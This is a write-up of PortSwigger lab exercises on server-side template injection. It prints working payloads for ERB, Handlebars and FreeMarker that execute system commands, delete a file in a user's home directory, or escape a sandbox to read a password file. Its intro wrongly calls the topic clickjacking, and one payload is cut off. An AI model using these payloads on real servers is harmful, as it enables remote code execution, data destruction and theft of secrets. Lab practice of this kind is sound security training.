# Intro
This post/writeup is all about the Clickjacking Vulnerabilities.

I'll be using primarily [Portswigger Web Academy](https://portswigger.net/web-security/server-side-template-injection) Labs, but i do intent do throw other labs and writeups here as well.

To learn more on the topic, please visit the article linked above at Portswigger's.

# Basic server-side template injection

When we start the lab and open a product, we would see following request which is obviously being reflected:

![picture 0](/assets/images/2500c49399826a11b6d4c700819461590b012046c89ac6f3c4b5bda78991cc5c.png)  

After checking the documentation for ERB templating (Ruby), this synthax should return `49`: ==> `<%= 7*7 %>`.

![picture 1](/assets/images/0643f790d7937176928eeabdfa06baa1b79f24fc6c03b6380f8f8939e127b6bd.png)  

As seen above, we do get `49` reflected. Now we need to delete a file `morale.txt`.

This synthax runs commands on the system:

```html
<%= system("ls -la /home") %>
```

# Basic server-side template injection (code context)

Let us log in:

```
[...]
blog-post-author-display=<%=+7*7+=>&csrf=kLGizM6pptgkDClzV9yZQKn4Q2OVfEb8
```

When i've ran the request above, error occured when sending comming in a blog post, but when i changed the parameter to `blog-post-author-display=7*7`, the `49` is shown instead of the `Name`:

This one was more tricky to exploit as os lib is not imported and we have to do it first. This is the final payload:

```roby
blog-post-author-display=user.name\}\}{"import os"}\{\{os.system("rm /home/carlos/morale.txt")
```


# Server-side template injection using documentation
> This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

We can login using credentials provided and check the post:

Forcing an error revelas that `FreeMarker` (Java) is being used.

Command execution:

Now all we have to do is remove the file from the system `/home/carlos/morale.txt`.

# Server-side template injection in an unknown language with a documented exploit
> This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

In this lab, if we pay attention to requests issued from the app, we'll again see that user input is being reflected in the response through the `message` parameter.

Inserting the `{{7*7}}` displays `49` in the output.

Working [exploit](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html) code:

```html
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/....');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}

```

Like in the previous labs, let us log in, go to a post and try to edit template and insert something like `{{7*7}}`:

![picture 9](/assets/images/ba7fa10ea85b30ea9413e131e02d6529f2e10664006bb24365735142490c665f.png)  

The app is running on python, version `2.7` and is running on Django.

Here i just tried the few possible exploits for Python templates and this one gave me the key that we need:

![picture 10](/assets/images/38891fbb24bdcbabec653a5244bab5e41bbe22a4994cf9452127c6fcf9840eff.png)  

Here more information regarding exploitation of Jinja2 can been found: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti

# Server-side template injection in a sandboxed environment
> This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file my_password.txt from Carlos's home directory. Then submit the contents of the file.

Log in, as in previous labs, go to blog post and edit it. `${7*7}` should return `49`, when previewing the post.

We can access `product` object as we even see it in the template, e.g.: `product.name`, `product.price`.


```html
# Let's what we can get:
${product.getClass()} ==> class lab.actions.templateengines.FreeMarkerProduct

${product.getClass().getProtectionDomain()} ==> ProtectionDomain (file:/opt/jars/freemarker.jar <no signer certificates>) jdk.internal.loader.ClassLoaders$AppClassLoader@64729b1e <no principals> java.security.Permissions@5fa07e12 ( ("java.lang.RuntimePermission" "exitVM") ("java.io.FilePermission" "/opt/jars/freemarker.jar" "read") )

# Getting methods does not work, but with getClass we can use the documentation
${product.getClass().getMethods()} ==> ERROR as it returns an array.

# I was not able to get a list of methods in this way, but documentation 
https://docs.oracle.com/javase/8/docs/api/java/lang/Class.html
https://docs.oracle.com/javase/8/docs/api/java/security/ProtectionDomain.html
https://docs.oracle.com/javase/8/docs/api/java/security/CodeSource.html

etc.
```

Working payload:
```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

This will return a byte array of the file we're trying to read.
